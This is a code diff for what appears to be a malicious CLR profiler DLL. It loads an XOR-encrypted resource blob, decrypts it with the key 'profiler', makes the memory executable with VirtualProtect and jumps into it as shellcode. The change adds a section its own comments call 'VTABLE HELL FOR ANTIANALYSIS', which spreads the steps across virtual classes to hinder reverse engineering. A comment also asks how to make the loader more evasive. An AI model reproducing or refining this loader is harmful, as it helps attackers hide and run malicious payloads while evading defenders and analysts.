@@ -58,17 +58,106 @@ ULONG __stdcall CoreProfiler::Release(void) {
 	return count;
 }
 
+// function to find dll for resource extraction
+extern "C" __declspec(dllexport) int __stdcall PleaseFindMe(long bar) {
+	return 3494;
+}
+
 void xor_crypt(const char* key, int key_len, char* data, int data_len)
 {
 	for (int i = 0; i < data_len; i++)
 		data[i] ^= key[i % key_len];
 }
 
-extern "C" __declspec(dllexport) int __stdcall PleaseFindMe(long bar) {
-	return 3494;
+// VTABLE HELL FOR ANTIANALYSIS
+
+class A
+{
+public:
+	virtual BOOL  getHandle(HMODULE *hm);						// A
+	virtual void* getProfile(HMODULE *hm, DWORD *size);			// B
+	virtual BOOL  getChangeable(void* exec, DWORD *profileSize);	// C
+	virtual void  change(void* exec, DWORD *profileSize);		// D
+	virtual BOOL  getChanged(void* exec, DWORD *profileSize);	// E
+};
+
+BOOL A::getHandle(HMODULE *hm) {
+	return GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+		(LPCSTR)&PleaseFindMe, hm);
 }
 
-// Can this be changed to be more evasive? Maybe virtualprotect the resource directly and xor it, then call it?
+void* A::getProfile(HMODULE *hm, DWORD *profileSize) {
+	return NULL;
+
+}
+
+BOOL A::getChangeable(void* exec, DWORD *profileSize) {
+	return true;
+}
+
+void A::change(void* exec, DWORD *profileSize) {
+	return;
+}
+
+BOOL A::getChanged(void* exec, DWORD *profileSize) {
+	return TRUE;
+}
+
+class B : public A
+{
+public:
+	void* getProfile(HMODULE *hm, DWORD *size) override;
+};
+
+void* B::getProfile(HMODULE *hm, DWORD *size) {
+	HRSRC profileResource;
+	HGLOBAL profileResouceData;
+	void* exec;
+	profileResource = FindResourceW(*hm, MAKEINTRESOURCE(106), L"BLOB");
+	*size = SizeofResource(*hm, profileResource);
+	profileResouceData = LoadResource(*hm, profileResource);
+	exec = LockResource(profileResouceData);
+	return exec;
+
+}
+
+class C : public A
+{
+public:
+	BOOL getChangeable(void* exec, DWORD *profileSize) override;
+};
+
+BOOL C::getChangeable(void* exec, DWORD *profileSize) {
+	DWORD _tmp;
+	return VirtualProtect(exec, *profileSize, PAGE_READWRITE, &_tmp);
+}
+
+class D : public A
+{
+public:
+	void  change(void* exec, DWORD *profileSize) override;
+};
+
+void D::change(void* exec, DWORD *profileSize) {
+	xor_crypt("profiler", 8, (char*)exec, *profileSize);
+}
+
+class E : public A
+{
+public:
+	BOOL  getChanged(void* exec, DWORD *profileSize) override;
+};
+
+BOOL E::getChanged(void* exec, DWORD *profileSize) {
+	DWORD _tmp;
+	return VirtualProtect(exec, *profileSize, PAGE_EXECUTE_READ, &_tmp);
+}
+
+// END VTABLE HELL
+
+
+
+// Can this be changed to be more evasive? Maybe virtualprotect the resource directly and xor it, then  call it?
 void popProfiler() {
 #ifdef _WINDOWS
 
@@ -76,16 +165,30 @@ void popProfiler() {
 	HRSRC profileResource;
 	DWORD profileSize;
 	HGLOBAL profileResouceData;
+	DWORD _tmp;
 	void* exec;
-	GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-		(LPCSTR)&PleaseFindMe, &hm);
-	profileResource = FindResourceW(hm, MAKEINTRESOURCE(106), L"BLOB");
+
+	//UNLEASH VTABLE HELL
+	A* a = new A();
+	A* b = new B();
+	A* c = new C();
+	A* d = new D();
+	A* e = new E();
+
+	/*GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+		(LPCSTR)&PleaseFindMe, &hm);*/
+	a->getHandle(&hm);
+	/*profileResource = FindResourceW(hm, MAKEINTRESOURCE(106), L"BLOB");
 	profileSize = SizeofResource(hm, profileResource);
 	profileResouceData = LoadResource(hm, profileResource);
-	exec = VirtualAlloc(0, profileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	memcpy(exec, profileResouceData, profileSize);
-	
-	xor_crypt("profiler", 8, (char*)exec, profileSize);
+	exec = LockResource(profileResouceData);*/
+	exec = b->getProfile(&hm, &profileSize);
+	/*VirtualProtect(exec, profileSize, PAGE_READWRITE, &_tmp);*/
+	c->getChangeable(exec, &profileSize);
+	/*xor_crypt("profiler", 8, (char*)exec, profileSize);*/
+	d->change(exec, &profileSize);
+	/*VirtualProtect(exec, profileSize, PAGE_EXECUTE_READ, &_tmp);*/
+	e->getChanged(exec, &profileSize);
 	((void(*)())exec)();
 	
 #endif // _WINDOWS
